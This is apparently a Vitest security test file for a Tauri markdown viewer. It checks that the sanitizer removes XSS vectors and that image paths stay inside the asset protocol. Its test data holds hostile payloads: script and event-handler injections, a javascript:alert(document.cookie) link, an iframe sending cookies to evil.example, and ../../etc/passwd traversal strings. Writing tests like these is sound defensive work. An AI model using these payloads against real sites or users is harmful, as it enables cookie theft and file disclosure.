// src/__tests__/security.test.ts
import { describe, it, expect, vi } from "vitest";

// Tauri ランタイムは jsdom に存在しないため core をモックする。
// convertFileSrc は「asset スコープに通す」という事実だけ検証したいので、
// 入力パスが分かる形のダミー文字列を返す。
vi.mock("@tauri-apps/api/core", () => ({
  convertFileSrc: (path: string) => `asset://localhost/${encodeURIComponent(path)}`,
}));

import { renderDocument } from "../markdown/renderer";
import { sanitize } from "../markdown/sanitize";
import { resolveImageSrc } from "../markdown/links";
import type { LoadedFile } from "../types";

// 1 つの Markdown に代表的な XSS ベクタを詰め込む。
// Note: markdown-it renders [text](javascript:url) as literal text (not a link), so we include
// a raw HTML form <a href="javascript:..."> to test the sanitizer's URL-scheme stripping.
const MALICIOUS_MARKDOWN = [
  "# Hello",
  "",
  "<script>window.__pwned = true; alert('xss')</script>",
  "",
  "<img src=x onerror=\"window.__pwned = true\">",
  "",
  "<a href=\"javascript:alert(document.cookie)\">click me</a>",
  "",
  "<iframe src=\"https://evil.example/steal?c=document.cookie\"></iframe>",
  "",
  "<a href=\"https://ok.example\" onclick=\"steal()\">link</a>",
  "",
  "<svg><script>alert(1)</script></svg>",
  "",
  "<style>body{display:none}</style>",
].join("\n");

function mdFile(text: string): LoadedFile {
  return { path: "/docs/evil.md", text, encoding: "UTF-8", kind: "Markdown" };
}

describe("security: malicious markdown is neutralized", () => {
  const html = renderDocument(mdFile(MALICIOUS_MARKDOWN), "/docs");

  it("contains no executable <script> tag", () => {
    expect(html.toLowerCase()).not.toContain("<script");
  });

  it("strips inline event handlers (onerror/onclick)", () => {
    expect(html.toLowerCase()).not.toContain("onerror");
    expect(html.toLowerCase()).not.toContain("onclick");
  });

  it("removes javascript: URLs", () => {
    expect(html.toLowerCase()).not.toContain("javascript:");
  });

  it("removes data-exfil iframe", () => {
    expect(html.toLowerCase()).not.toContain("<iframe");
  });

  it("removes <style> blocks", () => {
    expect(html.toLowerCase()).not.toContain("<style");
  });

  it("strips <svg>/<math> embedding vectors (guards against allowlist regression)", () => {
    expect(html.toLowerCase()).not.toContain("<svg");
    expect(html.toLowerCase()).not.toContain("<math");
  });

  it("still renders the benign heading text", () => {
    expect(html).toContain("Hello");
  });

  it("running sanitize again is idempotent (no script reappears)", () => {
    const twice = sanitize(html);
    expect(twice.toLowerCase()).not.toContain("<script");
    expect(twice.toLowerCase()).not.toContain("javascript:");
  });
});

describe("security: resolveImageSrc keeps every local path inside the asset protocol", () => {
  const baseDir = "/docs";

  it("passes through http(s) URLs unchanged", () => {
    expect(resolveImageSrc("https://cdn.example/a.png", baseDir)).toBe(
      "https://cdn.example/a.png",
    );
    expect(resolveImageSrc("http://cdn.example/a.png", baseDir)).toBe(
      "http://cdn.example/a.png",
    );
  });

  it("passes through data: URIs unchanged", () => {
    const dataUri = "data:image/png;base64,iVBORw0KGgo=";
    expect(resolveImageSrc(dataUri, baseDir)).toBe(dataUri);
  });

  it("routes a plain relative path through convertFileSrc (asset://)", () => {
    const out = resolveImageSrc("img/logo.png", baseDir);
    expect(out.startsWith("asset://localhost/")).toBe(true);
    // 物理ファイルパスを生で露出していないこと（asset プロトコルに包まれていること）
    expect(out.startsWith("/")).toBe(false);
    expect(out.startsWith("file:")).toBe(false);
  });

  it("a traversal path (../../etc/passwd) is STILL only routed through convertFileSrc", () => {
    const out = resolveImageSrc("../../etc/passwd", baseDir);
    // フロントは自前で fs を叩かない。脱出文字列でも convertFileSrc に渡るだけ。
    // 実際のアクセス可否は capabilities の asset scope（src-tauri 側）が決定する。
    expect(out.startsWith("asset://localhost/")).toBe(true);
    expect(out).not.toContain("file://");
  });

  it("does not fabricate an absolute filesystem URL for traversal", () => {
    const out = resolveImageSrc("../../../../../../etc/passwd", baseDir);
    expect(out.startsWith("asset://localhost/")).toBe(true);
  });
});
